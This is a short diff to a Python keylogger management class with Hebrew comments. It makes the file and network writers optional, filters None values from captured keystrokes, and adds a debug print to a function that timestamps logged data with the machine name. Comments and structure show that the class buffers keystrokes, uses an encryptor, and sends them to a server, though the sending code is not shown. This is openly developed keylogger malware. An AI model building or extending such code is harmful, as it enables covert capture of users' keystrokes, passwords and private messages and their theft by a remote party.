@@ -8,7 +8,7 @@ from config import Config
 
 
 class KeyloggerManager:
-    def __init__(self, keylogger_service: Ikeylogger, file_writer: IWriter, network_writer: IWriter, encryptor: Encryptor):
+    def __init__(self, keylogger_service: Ikeylogger, encryptor: Encryptor, file_writer: IWriter = None, network_writer: IWriter=None):
         self.keylogger_service = keylogger_service
         self.file_writer = file_writer
         self.network_writer = network_writer
@@ -54,8 +54,10 @@ class KeyloggerManager:
         try:
             keys = self.keylogger_service.get_logged_keys()
             if keys:
+                # סנן None values
+                filtered_keys = [key for key in keys if key is not None]
                 with self.buffer_lock:
-                    self.buffer.extend(keys)
+                    self.buffer.extend(filtered_keys)
                 self._process_buffer()
         except Exception as e:
             print(f"Error during collection: {e}")
@@ -82,6 +84,7 @@ class KeyloggerManager:
 # פונקציה שמוסיפה זמן
     def _add_timestamp(self, data: str) -> str:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        print(data)
         return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
 
 # פונקציה ששולחת לצד שרת
